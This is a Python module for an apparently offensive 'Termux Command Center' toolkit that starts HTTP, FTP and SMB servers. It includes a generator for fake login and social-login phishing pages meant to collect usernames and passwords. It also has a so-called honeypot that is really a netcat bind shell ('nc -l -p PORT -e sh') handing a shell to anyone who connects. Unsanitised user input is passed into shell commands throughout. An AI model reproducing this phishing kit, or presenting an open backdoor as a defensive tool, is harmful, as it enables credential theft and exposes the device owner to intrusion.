"""
Web Servers Module for Termux Command Center
Tools for spinning up various web servers for different purposes.
"""

import os
import signal
import time
from pathlib import Path

class Module:
    def __init__(self, command_center):
        self.cc = command_center
        self.description = "Web servers for various purposes"
        self.servers_dir = self.cc.tools_dir / "servers"
        self.servers_dir.mkdir(exist_ok=True)
        self.running_servers = {}

    def run(self):
        print("\n=== Web Servers ===")
        print("1. Start HTTP server")
        print("2. Start FTP server")
        print("3. Start SMB server")
        print("4. Start custom server")
        print("5. List running servers")
        print("6. Stop server")
        print("7. Create phishing page")
        print("8. Start honeypot")
        print("0. Back to main menu")

        while True:
            choice = input("Enter your choice: ").strip()
            if choice == "0":
                break
            elif choice == "1":
                self.start_http_server()
            elif choice == "2":
                self.start_ftp_server()
            elif choice == "3":
                self.start_smb_server()
            elif choice == "4":
                self.start_custom_server()
            elif choice == "5":
                self.list_servers()
            elif choice == "6":
                self.stop_server()
            elif choice == "7":
                self.create_phishing_page()
            elif choice == "8":
                self.start_honeypot()
            else:
                print("Invalid choice.")

            input("\nPress Enter to continue...")

    def start_http_server(self):
        port = input("Enter port (default 8080): ").strip() or "8080"
        directory = input("Directory to serve (default current): ").strip() or "."
        print(f"Starting HTTP server on port {port} in {directory}...")
        cmd = f"python3 -m http.server {port}"
        stdout, stderr, code = self.cc.run_command(cmd, cwd=directory)
        if code == 0:
            print("HTTP server started. Access at http://localhost:{port}")
        else:
            print("Failed to start server:", stderr)

    def start_ftp_server(self):
        print("Starting FTP server...")
        # Use pure-ftpd or similar
        stdout, stderr, code = self.cc.run_command("pure-ftpd -p 2121:2121 -P localhost")
        if code == 0:
            print("FTP server started on port 2121")
        else:
            print("pure-ftpd not found. Install with: pkg install pure-ftpd")
            print("Alternative: python -m pyftpdlib")

    def start_smb_server(self):
        print("Starting SMB server...")
        stdout, stderr, code = self.cc.run_command("impacket-smbserver share /sdcard -smb2support")
        if code == 0:
            print("SMB server started")
        else:
            print("impacket not found. Install with: pip install impacket")

    def start_custom_server(self):
        script = input("Enter server script path: ").strip()
        if os.path.exists(script):
            port = input("Enter port: ").strip()
            cmd = f"python3 {script} {port}" if port else f"python3 {script}"
            stdout, stderr, code = self.cc.run_command(cmd)
            print(stdout)
        else:
            print("Script not found")

    def list_servers(self):
        print("Checking running servers...")
        stdout, stderr, code = self.cc.run_command("ps aux | grep -E '(python|ftpd|smbd)' | grep -v grep")
        print(stdout)

    def stop_server(self):
        port = input("Enter port to stop server on: ").strip()
        print(f"Stopping server on port {port}...")
        stdout, stderr, code = self.cc.run_command(f"pkill -f ':{port}'")
        if code == 0:
            print("Server stopped")
        else:
            print("Failed to stop server")

    def create_phishing_page(self):
        template = input("Template (login/social): ").strip().lower()
        if template == "login":
            html = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <form action="/login" method="post">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""
        elif template == "social":
            html = """
<!DOCTYPE html>
<html>
<head><title>Social Login</title></head>
<body>
    <button onclick="login('facebook')">Login with Facebook</button>
    <button onclick="login('google')">Login with Google</button>
    <script>
        function login(provider) {
            fetch('/login', {
                method: 'POST',
                body: JSON.stringify({provider: provider})
            });
        }
    </script>
</body>
</html>
"""
        else:
            html = "<html><body><h1>Phishing Page</h1></body></html>"

        filename = self.servers_dir / "phish.html"
        with open(filename, 'w') as f:
            f.write(html)
        print(f"Phishing page created: {filename}")
        print("Start HTTP server to serve it")

    def start_honeypot(self):
        print("Starting basic honeypot...")
        # Simple honeypot using netcat
        port = input("Enter port (default 2222): ").strip() or "2222"
        print(f"Starting honeypot on port {port}")
        cmd = f"while true; do nc -l -p {port} -e sh; done"
        # This would run in background
        print("Honeypot command:", cmd)
        print("Note: Run in background for persistent honeypot")